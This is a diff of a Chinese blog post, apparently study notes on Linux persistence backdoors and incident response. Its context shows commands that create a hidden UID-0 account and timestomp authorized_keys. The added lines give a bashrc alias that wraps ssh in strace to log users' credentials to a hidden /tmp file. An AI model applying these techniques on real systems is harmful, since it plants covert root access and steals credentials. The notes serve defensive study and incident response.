@@ -134,9 +134,6 @@
 	  <p>半夜遇到服务器报警了（纯给自己挖坑），记录一下。</p>
 <span id="more"></span>
 
-<p>面试被问到了之后又学了一遍，没想到半夜就遇到服务器报警了（纯给自己挖坑），记录一下。</p>
-<!--more-->
-
 <h1 id="Linux权限维持——后门"><a href="#Linux权限维持——后门" class="headerlink" title="Linux权限维持——后门"></a>Linux权限维持——后门</h1><p>常见的后门有cron后门、ssh后门、vim后门、超级用户、alias后门等</p>
 <h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p>创建uid为0的用户，加入root初始登陆组和附加组，并设置home目录，这里可以把目录放在不容易找得到的地方。</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">useradd</span> <span class="token parameter variable">-p</span> <span class="token variable"><span class="token variable">`</span>openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> <span class="token string">'mysalt'</span> mypassword<span class="token variable">`</span></span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span> <span class="token parameter variable">-o</span> <span class="token parameter variable">-u</span> <span class="token number">0</span> <span class="token parameter variable">-g</span> root <span class="token parameter variable">-G</span> root <span class="token parameter variable">-s</span> /bin/bash <span class="token parameter variable">-d</span> /home/<span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -149,13 +146,22 @@
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>其中 <code>id_rsa</code>是私钥<code>id_rsa.pub</code> 是公钥。公钥追加到<code>~./ssh/authorized_keys</code>中。防止排查，还可以touch改一下文件的修改日期<code>touch -r ~./ssh/id_ras ~./ssh/authorized_keys</code>。</p>
-<h3 id="SSH-Wrapper"><a href="#SSH-Wrapper" class="headerlink" title="SSH Wrapper"></a>SSH Wrapper</h3><h3 id="SSH-软连接"><a href="#SSH-软连接" class="headerlink" title="SSH 软连接"></a>SSH 软连接</h3><p>这块在提权方面也有一些路径，也放在坑里。<br>这块用到了PAM认证的机制，但几篇博客看下来操作的方法都不太一样。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/pingan233/article/details/129168638">https://blog.csdn.net/pingan233/article/details/129168638</a></p>
+<h3 id="SSH-Wrappertodo"><a href="#SSH-Wrappertodo" class="headerlink" title="SSH Wrappertodo"></a>SSH Wrappertodo</h3><h3 id="SSH-软连接todo"><a href="#SSH-软连接todo" class="headerlink" title="SSH 软连接todo"></a>SSH 软连接todo</h3><p>这块在提权方面也有一些路径，也放在坑里。<br>这块用到了PAM认证的机制，但几篇博客看下来操作的方法都不太一样。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/pingan233/article/details/129168638">https://blog.csdn.net/pingan233/article/details/129168638</a></p>
 <h3 id="PAM密码记录后门"><a href="#PAM密码记录后门" class="headerlink" title="PAM密码记录后门"></a>PAM密码记录后门</h3><p><a target="_blank" rel="noopener" href="https://www.v4ler1an.com/2020/12/backdoor/#6-linux-pam%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0">https://www.v4ler1an.com/2020/12/backdoor/#6-linux-pam%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8618">https://xz.aliyun.com/t/8618</a></p>
 <p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2129693">PAM系统模块说明</a></p>
-<h3 id="SSH-Keylogger"><a href="#SSH-Keylogger" class="headerlink" title="SSH Keylogger"></a>SSH Keylogger</h3><p>利用strace系统调试工具跟踪ssh的系统调用，生成一个包含ssh命令执行期间的系统调用信息日志文件</p>
+<h3 id="SSH-Keyloggertodo"><a href="#SSH-Keyloggertodo" class="headerlink" title="SSH Keyloggertodo"></a>SSH Keyloggertodo</h3><p>利用strace系统调试工具跟踪ssh的系统调用，生成一个包含ssh命令执行期间的系统调用信息日志文件</p>
 <h3 id="strace监听ssh来源流量（alias欺骗）"><a href="#strace监听ssh来源流量（alias欺骗）" class="headerlink" title="strace监听ssh来源流量（alias欺骗）"></a>strace监听ssh来源流量（alias欺骗）</h3><p><strong>strace命令</strong> 是一个集诊断、调试、统计与一体的工具，我们可以使用strace对应用的系统调用和信号传递的跟踪结果来对应用进行分析，以达到解决问题或者是了解应用工作过程的目的。strace的最简单的用法就是执行一个指定的命令，在指定的命令结束之后它也就退出了。在命令执行的过程中，strace会记录和解析命令进程的所有系统调用以及这个进程所接收到的所有的信号值。（<a target="_blank" rel="noopener" href="https://wangchujiang.com/linux-command/c/strace.html%EF%BC%89">https://wangchujiang.com/linux-command/c/strace.html）</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7698">linux后渗透之收集登录凭证</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34923966/article/details/113917207">键盘记录、凭证抓取</a></p>
+<p>因此可以通过添加alias，对想要跟踪的命令做监控，输出到一个隐蔽的位置里，如</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#vim /etc/bashrc</span>
+<span class="token builtin class-name">alias</span> <span class="token assign-left variable">ssh</span><span class="token operator">=</span><span class="token string">'strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'</span>
+<span class="token comment"># source /root/.bashrc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>这样用户区ssh别的服务器的时候就能记录到了（来自<a target="_blank" rel="noopener" href="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-5-1.png%EF%BC%89">https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-5-1.png）</a></p>
+<img src="/2023/10/23/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%BA%94%E6%80%A5/privilege-5-5-1.png" class title="img">
+
+<p>不过排查也很简单，使用alias即可发现异常</p>
 <h2 id="SUID-Shell"><a href="#SUID-Shell" class="headerlink" title="SUID Shell"></a>SUID Shell</h2><p>SUID（set user id）是一种特殊权限机制，允许一个可执行文件在执行时短暂获得所有者的权限，而不是执行者的权限。即若一个文件被标记了SUID，他的属主是root，那么普通用户便可以以root的身份运行这个可执行文件。</p>
 <img src="/2023/10/23/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%BA%94%E6%80%A5/image-20231023213654136.png" class title="image-20231023213654136">
 
@@ -202,7 +208,7 @@
 <li>disown：将一个作业从作业表中移除，使其不受 shell 关闭的影响。</li>
 </ul>
 <p>唉扯远了。。。</p>
-<h2 id="TCP-Wrappers"><a href="#TCP-Wrappers" class="headerlink" title="TCP Wrappers"></a>TCP Wrappers</h2><h2 id="Openssh后门"><a href="#Openssh后门" class="headerlink" title="Openssh后门"></a>Openssh后门</h2><h1 id="Linux权限维持——隐藏"><a href="#Linux权限维持——隐藏" class="headerlink" title="Linux权限维持——隐藏"></a>Linux权限维持——隐藏</h1><h1 id="Linux应急响应"><a href="#Linux应急响应" class="headerlink" title="Linux应急响应"></a>Linux应急响应</h1><h2 id="计划任务检查"><a href="#计划任务检查" class="headerlink" title="计划任务检查"></a>计划任务检查</h2><p><strong>读文件的方法获取计划任务</strong> ：</p>
+<h2 id="TCP-Wrapperstodo"><a href="#TCP-Wrapperstodo" class="headerlink" title="TCP Wrapperstodo"></a>TCP Wrapperstodo</h2><h2 id="Openssh后门todo"><a href="#Openssh后门todo" class="headerlink" title="Openssh后门todo"></a>Openssh后门todo</h2><h1 id="Linux权限维持——隐藏todo"><a href="#Linux权限维持——隐藏todo" class="headerlink" title="Linux权限维持——隐藏todo"></a>Linux权限维持——隐藏todo</h1><h1 id="Linux应急响应todo"><a href="#Linux应急响应todo" class="headerlink" title="Linux应急响应todo"></a>Linux应急响应todo</h1><h2 id="计划任务检查"><a href="#计划任务检查" class="headerlink" title="计划任务检查"></a>计划任务检查</h2><p><strong>读文件的方法获取计划任务</strong> ：</p>
 <ol>
 <li>在&#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录下存放着所有用户的计划任务，可以一个个cat</li>
 <li>脚本读</li>
@@ -284,6 +290,17 @@
 
 	<!-- categories -->
     
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Linux/">Linux<span>3</span></a></li> <li><a href="/categories/Linux/pentest/">pentest<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
 
 	<!-- tags -->
 	
@@ -298,6 +315,12 @@
 
 	<!-- toc -->
 	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E2%80%94%E2%80%94%E5%90%8E%E9%97%A8"><span class="toc-article-text">Linux权限维持——后门</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span class="toc-article-text">添加用户</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SSH%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-article-text">SSH的利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%9B%B4%E6%8E%A5%E5%85%AC%E7%A7%81%E9%92%A5%E5%88%A9%E7%94%A8"><span class="toc-article-text">直接公私钥利用</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SSH-Wrappertodo"><span class="toc-article-text">SSH Wrappertodo</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SSH-%E8%BD%AF%E8%BF%9E%E6%8E%A5todo"><span class="toc-article-text">SSH 软连接todo</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PAM%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8"><span class="toc-article-text">PAM密码记录后门</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SSH-Keyloggertodo"><span class="toc-article-text">SSH Keyloggertodo</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#strace%E7%9B%91%E5%90%ACssh%E6%9D%A5%E6%BA%90%E6%B5%81%E9%87%8F%EF%BC%88alias%E6%AC%BA%E9%AA%97%EF%BC%89"><span class="toc-article-text">strace监听ssh来源流量（alias欺骗）</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SUID-Shell"><span class="toc-article-text">SUID Shell</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1crontab"><span class="toc-article-text">计划任务crontab</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#crontab%E7%9A%84%E6%97%B6%E9%97%B4%E6%A0%BC%E5%BC%8F"><span class="toc-article-text">crontab的时间格式</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#TCP-Wrapperstodo"><span class="toc-article-text">TCP Wrapperstodo</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Openssh%E5%90%8E%E9%97%A8todo"><span class="toc-article-text">Openssh后门todo</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E2%80%94%E2%80%94%E9%9A%90%E8%97%8Ftodo"><span class="toc-article-text">Linux权限维持——隐藏todo</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94todo"><span class="toc-article-text">Linux应急响应todo</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%A3%80%E6%9F%A5"><span class="toc-article-text">计划任务检查</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%8F%82%E8%80%83"><span class="toc-article-text">参考</span></a></li></ol>
+		</div>
 	
 	</div>
 	
